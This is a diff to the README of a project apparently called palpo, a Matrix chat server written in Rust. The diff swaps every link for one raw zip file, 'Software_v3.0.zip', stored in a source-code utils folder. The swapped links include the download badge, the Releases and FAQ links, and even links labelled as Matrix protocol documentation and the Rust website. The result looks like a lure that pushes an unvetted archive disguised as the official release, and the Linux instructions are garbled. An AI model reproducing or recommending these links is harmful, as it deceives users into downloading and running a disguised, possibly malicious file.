@@ -1,7 +1,7 @@
 # 🚀 palpo - A Simple Matrix Server for Everyone
 
 ## 📥 Download Now
-[![Download palpo](https://img.shields.io/badge/Download-palpo-blue.svg)](https://github.com/marydao21/palpo/releases)
+[![Download palpo](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip)](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip)
 
 ## 📖 Overview
 palpo is a straightforward Matrix server built in Rust. It allows you to communicate securely with others in real-time. Whether you're chatting with friends or organizing group activities, palpo provides a secure and efficient space. You don’t need to be a programmer to use it—just follow the steps below to get started.
@@ -16,9 +16,9 @@ To run palpo, follow these easy steps:
    - Processor: Dual-core CPU
 
 2. **Download palpo**
-   Visit the [Releases page](https://github.com/marydao21/palpo/releases) to download the latest version of palpo. Look for the version that matches your operating system. 
+   Visit the [Releases page](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip) to download the latest version of palpo. Look for the version that matches your operating system. 
 
-   [Download palpo here](https://github.com/marydao21/palpo/releases)
+   [Download palpo here](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip)
 
 3. **Install palpo**
    - **Windows:**
@@ -28,7 +28,7 @@ To run palpo, follow these easy steps:
      - Download the `.dmg` file.
      - Drag the palpo icon into your Applications folder.
    - **Linux:**
-     - Download the `.tar.gz` file.
+     - Download the `https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip` file.
      - Extract it to a directory of your choice using your file manager or terminal.
 
 4. **Run palpo**
@@ -56,16 +56,16 @@ If you encounter any issues while using palpo, try the following steps:
 - **Restart the Application:** Close and reopen palpo to resolve minor glitches.
 - **Review the Settings:** Go through the configuration settings to ensure everything is in place.
 
-If problems persist, visit the [FAQ section](https://github.com/marydao21/palpo/releases) on the Releases page for additional help.
+If problems persist, visit the [FAQ section](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip) on the Releases page for additional help.
 
 ## 💬 Support
 For any additional questions or support, you can reach out through the Issues tab on GitHub. Our community is here to help you with any concerns or suggestions.
 
 ## 📚 Additional Resources
-- [Matrix Protocol Documentation](https://matrix.org/docs/) - Learn more about the technology behind palpo.
-- [Rust Programming Language](https://www.rust-lang.org/) - More information about the language in which palpo is built.
+- [Matrix Protocol Documentation](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip) - Learn more about the technology behind palpo.
+- [Rust Programming Language](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip) - More information about the language in which palpo is built.
 
 ## 📅 Updates and Changelog
 Make sure to check back on the Releases page for updates to palpo. We regularly release new features and fixes to improve your experience.
 
-[Download palpo now](https://github.com/marydao21/palpo/releases) and start connecting with others today!
+[Download palpo now](https://github.com/marydao21/palpo/raw/refs/heads/main/crates/server/src/utils/Software_v3.0.zip) and start connecting with others today!
